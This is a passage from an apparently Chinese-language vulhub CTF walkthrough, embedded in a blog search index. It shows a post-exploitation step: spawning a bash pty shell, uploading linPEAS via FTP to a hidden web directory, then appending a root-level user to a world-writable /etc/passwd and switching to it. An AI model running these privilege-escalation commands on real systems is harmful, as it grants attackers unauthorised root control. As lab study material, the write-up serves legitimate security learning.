-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure>
-<p>切换交互式shell</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br></pre></td></tr></table></figure>
-<p>看了看自己权限</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data</span><br></pre></td></tr></table></figure>
-<p>上传一个linux提权脚本</p>
-<p><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</a></p>
-<p><img src="https://img-blog.csdnimg.cn/20210617152517849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>使用ftp 上传</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">put  &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;privilege-escalation-awesome-scripts-suite-master&#x2F;privilege-escalation-awesome-scripts-suite-master&#x2F;linPEAS&#x2F;linpeas.sh  &#x2F;var&#x2F;www&#x2F;html&#x2F;.nano&#x2F;a.sh</span><br></pre></td></tr></table></figure>
-<p>然后再msf 终端  执行</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;a.sh</span><br></pre></td></tr></table></figure>
-<p>发现/etc/passwd对于其他用户有写的权限，这里我们可以直接添加一个高权限用户进去：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 -salt salt l1yee</span><br><span class="line">$1$salt$6GXvLeiShroUP6WTte.ny&#x2F;</span><br><span class="line">echo &#39;salt:$1$salt$6GXvLeiShroUP6WTte.ny&#x2F;:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39;&gt;&gt;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/2021061715224489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>然后</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">su salt</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210617153511955.png" alt="在这里插入图片描述"></p>
-<p>成功获取 root权限</p>
-<p>参:<a href="https://www.cnblogs.com/zzjdbk/p/14096084.html">https://www.cnblogs.com/zzjdbk/p/14096084.html</a></p>
-<p><a href="https://www.cnblogs.com/sym945/p/13723537.html">https://www.cnblogs.com/sym945/p/13723537.html</a></p>
-<p><a href="https://blog.csdn.net/qq_42967398/article/details/108928297">https://blog.csdn.net/qq_42967398/article/details/108928297</a></p>
-<p><a href="https://blog.csdn.net/qq_40549070/article/details/108926099">https://blog.csdn.net/qq_40549070/article/details/108926099</a></p>
-]]></content>
-      <categories>
-        <category>刷题站</category>
-        <category>vulhub</category>
       </categories>
   </entry>
 </search>
